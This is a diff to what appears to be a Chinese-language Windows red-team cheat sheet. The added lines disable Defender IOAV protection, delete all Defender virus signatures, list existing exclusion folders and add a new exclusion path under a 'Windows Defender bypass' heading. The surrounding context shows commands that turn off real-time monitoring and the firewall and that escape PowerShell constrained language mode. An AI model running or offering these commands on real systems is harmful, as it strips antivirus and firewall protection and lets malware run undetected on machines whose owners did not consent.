@@ -38,6 +38,8 @@ PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 (cmd下)
 ```
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 
+Set-MpPreference -DisableIOAVProtection $true
+
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
 ```
 
@@ -50,6 +52,11 @@ NetSh Advfirewall set allprofiles state off
 查看防火墙
 ```
 netsh advfirewall show currentprofile
+```
+
+# 启用wd，删除所有病毒签名
+```
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
 # powershell脚本加载
@@ -120,6 +127,20 @@ $ExecutionContext.SessionState.LanguageMode
 绕过
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\clm.exe"
+```
+
+# Windows Defender绕过
+
+以下命令需要admin权限
+
+枚举所有wd放行的文件夹
+```
+Get-MpPreference | select-object -ExpandProperty ExclusionPath
+```
+
+加一个排除项文件夹
+```
+Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"
 ```
 
 # PowerShell 内存注入
